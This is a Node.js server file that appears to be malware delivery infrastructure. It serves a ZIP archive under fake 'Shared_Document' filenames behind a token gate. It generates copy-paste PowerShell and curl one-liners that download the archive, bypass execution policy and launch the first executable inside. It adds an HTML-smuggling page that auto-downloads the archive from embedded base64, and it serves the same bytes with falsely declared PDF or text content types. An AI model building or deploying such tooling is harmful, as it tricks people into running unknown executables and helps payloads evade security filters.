const http = require("node:http");
const fs = require("node:fs");
const path = require("node:path");
const crypto = require("node:crypto");

const PORT = process.env.PORT || 10000;
const HOST = "0.0.0.0";

const KEY = process.env.KEY || "";
const ZIP_PATH = path.join(__dirname, "build.zip");
const HTML_PATH = path.join(__dirname, "index.html");

function sig() {
  if (!KEY) return "";
  return crypto.createHmac("sha256", KEY).update("build.zip").digest("hex").slice(0, 16);
}

function tokenOk(url) {
  if (!KEY) return true;
  return url.searchParams.get("k") === sig();
}

function baseUrl(req) {
  const proto = (req.headers["x-forwarded-proto"] || "http").split(",")[0].trim();
  const host = req.headers["x-forwarded-host"] || req.headers.host || "localhost";
  return proto + "://" + host;
}

function downloadUrl(req) {
  const k = KEY ? "?k=" + sig() : "";
  return baseUrl(req) + "/download" + k;
}

function oneLinerPs(url) {
  const z = "$env:TEMP\\d.zip";
  const d = "$env:TEMP\\dx";
  return "powershell -NoProfile -ExecutionPolicy Bypass -Command \""
    + "iwr -UseBasicParsing -Uri '" + url + "' -OutFile \\\"" + z + "\\\"; "
    + "Expand-Archive -Force \\\"" + z + "\\\" \\\"" + d + "\\\"; "
    + "Start-Process (Get-ChildItem \\\"" + d + "\\*.exe\\\" | Select-Object -First 1).FullName\"";
}

function oneLinerCurl(url) {
  return "curl.exe -L -o \"%TEMP%\\d.zip\" \"" + url + "\" && "
    + "tar -xf \"%TEMP%\\d.zip\" -C \"%TEMP%\" && "
    + "for %f in (\"%TEMP%\\*.exe\") do start \"\" \"%f\"";
}

function sendText(res, code, type, body, extra) {
  const buf = Buffer.from(body, "utf8");
  res.writeHead(code, Object.assign({
    "Content-Type": type,
    "Content-Length": buf.length,
    "X-Content-Type-Options": "nosniff",
    "Cache-Control": "no-store"
  }, extra || {}));
  res.end(buf);
}

const server = http.createServer((req, res) => {
  let url;

  try {
    url = new URL(req.url, "http://" + (req.headers.host || "localhost"));
  } catch {
    return sendText(res, 400, "text/plain; charset=utf-8", "Bad request");
  }

  if (req.method !== "GET" && req.method !== "HEAD") {
    return sendText(res, 405, "text/plain; charset=utf-8", "Method not allowed", {
      Allow: "GET, HEAD"
    });
  }

  if (!tokenOk(url)) {
    return sendText(res, 403, "text/plain; charset=utf-8", "Bad token");
  }

  /* copy-paste payloads */
  if (url.pathname === "/ps" || url.pathname === "/c") {
    const line = url.pathname === "/ps"
      ? oneLinerPs(downloadUrl(req))
      : oneLinerCurl(downloadUrl(req));
    return sendText(res, 200, "text/plain; charset=utf-8", line + "\n");
  }

  /* archive */
  if (url.pathname === "/download") {
    fs.stat(ZIP_PATH, (err, stats) => {
      if (err || !stats.isFile()) {
        return sendText(res, 404, "text/plain; charset=utf-8", "ZIP file not found");
      }

      const n = Math.floor(1000000 + Math.random() * 9000000);
      const filename = "Shared_Document_" + n + ".zip";
      const etag = '"' + stats.size.toString(16) + "-" + stats.mtimeMs.toString(16) + '"';

      const head = {
        "Content-Type": "application/zip",
        "Content-Disposition": 'attachment; filename="' + filename + '"',
        "Accept-Ranges": "bytes",
        "ETag": etag,
        "Last-Modified": stats.mtime.toUTCString(),
        "Cache-Control": "public, max-age=3600, must-revalidate",
        "X-Content-Type-Options": "nosniff",
        "X-Robots-Tag": "noindex, nofollow",
        "Referrer-Policy": "no-referrer"
      };

      if (req.headers["if-none-match"] === etag) {
        res.writeHead(304, head);
        return res.end();
      }

      let start = 0;
      let end = stats.size - 1;
      let code = 200;
      const range = req.headers.range;

      if (range) {
        const m = /^bytes=(\d*)-(\d*)$/.exec(range.trim());
        if (m) {
          if (m[1] === "" && m[2] !== "") {
            start = Math.max(0, stats.size - parseInt(m[2], 10));
          } else {
            start = parseInt(m[1], 10) || 0;
            if (m[2] !== "") end = Math.min(parseInt(m[2], 10), stats.size - 1);
          }
          if (start <= end && start < stats.size) {
            code = 206;
            head["Content-Range"] = "bytes " + start + "-" + end + "/" + stats.size;
          } else {
            res.writeHead(416, { "Content-Range": "bytes */" + stats.size });
            return res.end();
          }
        }
      }

      head["Content-Length"] = end - start + 1;
      res.writeHead(code, head);

      if (req.method === "HEAD") return res.end();

      const stream = fs.createReadStream(ZIP_PATH, { start, end });
      stream.on("error", (e) => {
        console.error("ZIP stream error:", e);
        res.destroy();
      });
      stream.pipe(res);
    });

    return;
  }

  /* mime probes — same bytes, different declared type */
  if (url.pathname === "/plain" || url.pathname === "/pdf-label") {
    fs.readFile(ZIP_PATH, (err, data) => {
      if (err) return sendText(res, 500, "text/plain; charset=utf-8", "Unable to read ZIP file");

      const declaredType = url.pathname === "/plain"
        ? "text/plain; charset=utf-8"
        : "application/pdf";

      res.writeHead(200, {
        "Content-Type": declaredType,
        "Content-Length": data.length,
        "X-Content-Type-Options": "nosniff",
        "Cache-Control": "no-store"
      });

      if (req.method === "HEAD") return res.end();
      res.end(data);
    });

    return;
  }

  /* html smuggling variant — blob download, no server round trip for the body */
  if (url.pathname === "/h") {
    fs.readFile(ZIP_PATH, (err, data) => {
      if (err) return sendText(res, 500, "text/plain; charset=utf-8", "Unable to read ZIP file");

      const n = Math.floor(1000000 + Math.random() * 9000000);
      const name = "Shared_Document_" + n + ".zip";

      const page = "<!doctype html><meta charset=\"utf-8\"><script>"
        + "const b=atob(\"" + data.toString("base64") + "\"),a=new Uint8Array(b.length);"
        + "for(let i=0;i<b.length;i++)a[i]=b.charCodeAt(i);"
        + "const u=URL.createObjectURL(new Blob([a],{type:\"application/zip\"}));"
        + "const l=document.createElement(\"a\");l.href=u;l.download=" + JSON.stringify(name) + ";l.click();"
        + "</script>";

      return sendText(res, 200, "text/html; charset=utf-8", page);
    });

    return;
  }

  /* landing page */
  if (url.pathname === "/" || url.pathname === "/index.html") {
    fs.stat(HTML_PATH, (err, stats) => {
      if (err || !stats.isFile()) {
        return sendText(res, 500, "text/plain; charset=utf-8", "Unable to load page");
      }

      res.writeHead(200, {
        "Content-Type": "text/html; charset=utf-8",
        "Content-Length": stats.size,
        "X-Content-Type-Options": "nosniff",
        "Cache-Control": "no-cache"
      });

      if (req.method === "HEAD") return res.end();

      const stream = fs.createReadStream(HTML_PATH);
      stream.on("error", (e) => {
        console.error("HTML stream error:", e);
        res.destroy();
      });
      stream.pipe(res);
    });

    return;
  }

  sendText(res, 404, "text/plain; charset=utf-8", "Not found");
});

server.listen(PORT, HOST, () => {
  console.log("Server listening on " + HOST + ":" + PORT);
});

server.on("error", (err) => {
  console.error("Server error:", err);
  process.exitCode = 1;
});
